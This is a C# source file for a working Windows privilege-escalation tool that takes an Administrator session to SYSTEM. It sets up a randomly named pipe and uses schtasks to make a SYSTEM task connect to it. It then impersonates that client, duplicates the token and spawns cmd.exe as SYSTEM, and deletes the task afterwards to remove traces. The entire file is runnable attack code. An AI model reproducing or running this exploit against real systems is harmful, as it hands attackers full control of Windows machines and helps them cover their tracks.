using System.Diagnostics;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Text;

/*
 * Escalation of privilege from Administrator to SYSTEM
 * Requires high integrity process
 * Relies on schtasks to trigger named pipe connection as SYSTEM
*/

// P/Invoke functions to launch cmd.exe using the new impersonation token
public class Payload
{
    public void Start()
    {
        IntPtr threadHandle = GetCurrentThread();

        IntPtr tokenHandle;
        bool ret = OpenThreadToken(threadHandle, TOKEN_DUPLICATE, false, out tokenHandle);
        if (ret == false)
        {
            Console.WriteLine("[!] OpenThreadToken failed");
            return;
        }

        SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
        securityAttributes.bInheritHandle = false;
        securityAttributes.Length = Marshal.SizeOf(securityAttributes);
        securityAttributes.lpSecurityDescriptor = (IntPtr)0;
        IntPtr duplicateHandle;
        ret = DuplicateTokenEx(tokenHandle, GENERIC_ALL, ref securityAttributes, 2, 1, out duplicateHandle);
        if (ret == false)
        {
            Console.WriteLine("[!] DuplicateTokenEx failed");
            return;
        }

        STARTUPINFO startupINFO = new STARTUPINFO();
        startupINFO.cb = Marshal.SizeOf(startupINFO);
        PROCESS_INFORMATION processINFO = new PROCESS_INFORMATION();
        ret = CreateProcessWithTokenW(duplicateHandle, LOGON_WITH_PROFILE, null, "cmd.exe", 0, (IntPtr)0, null, ref startupINFO, out processINFO);
        if (ret == false)
        {
            Console.WriteLine("[!] CreateProcessWithTokenW failed");
            return;
        }
    }

    // Constants, structs, and declarations for P/Invoke functions
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint GENERIC_ALL = 0x10000000;
    const uint LOGON_WITH_PROFILE = 0x00000001;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentThread();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        uint DesiredAccess,
        bool OpenAsSelf,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        ref SECURITY_ATTRIBUTES lpTokenAttributes,
        uint ImpersonationLevel,
        uint TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);
}

public class Program
{
    static string randomName(int length)
    {
        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        char[] chosen = new char[length];
        Random random = new Random();
        for (int i = 0; i < chosen.Length; i++)
        {
            chosen[i] = chars[random.Next(chars.Length)];
        }

        return new string(chosen);
    }

    public static void Main()
    {
        string taskName = randomName(20);
        Console.WriteLine("[*] Task name: {0}", taskName);
        string pipeName = randomName(20);
        Console.WriteLine("[*] Pipe name: {0}", pipeName);

        NamedPipeServerStream server = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1);

        // Prevent commands from sending output to shell
        // Defined outside async task for later re-use
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "cmd.exe";
        startInfo.RedirectStandardInput = false;
        startInfo.RedirectStandardOutput = false;
        startInfo.RedirectStandardError = false;
        startInfo.UseShellExecute = false;
        startInfo.CreateNoWindow = true;
        Process process = new Process();
        process.StartInfo = startInfo;

        Console.WriteLine("[*] Starting scheduled task handler...");
        _ = Task.Run(() => {
            process.StartInfo.Arguments = $"/c schtasks /CREATE /TN {taskName} /RU SYSTEM /TR \"cmd.exe /c hostname > \\\\.\\pipe\\{pipeName}\" /SC ONCE /ST 00:00";
            process.Start();
            process.WaitForExit();

            process.StartInfo.Arguments = $"/c schtasks /RUN /TN {taskName}";
            process.Start();
            process.WaitForExit();
        });

        Console.WriteLine("[*] Starting named pipe server...\n");
        server.WaitForConnection();
        Console.WriteLine("[*] Client connected to named pipe!");

        // Data must be received before the client can be impersonated
        // Only a single byte will be received until impersonation is complete
        // Otherwise the client would break the pipe
        Console.WriteLine("[*] Reading first byte from named pipe...");
        byte[] bytes = new byte[1];
        server.Read(bytes, 0, 1);
        string data = Encoding.Default.GetString(bytes);

        Console.WriteLine("[*] Impersonating client {0}", server.GetImpersonationUserName());
        Payload payload = new Payload();
        server.RunAsClient(payload.Start);

        // Complete named pipe data transfer gracefully
        Console.WriteLine("[*] Closing named pipe...");
        data += new StreamReader(server).ReadToEnd();
        server.Disconnect();
        Console.Write("[*] Data received: {0}", data);

        // Doing this last to ensure deletion of scheduled task
        process.StartInfo.Arguments = $"/c schtasks /DELETE /TN {taskName} /F";
        process.Start();
        process.WaitForExit();

        return;
    }
}
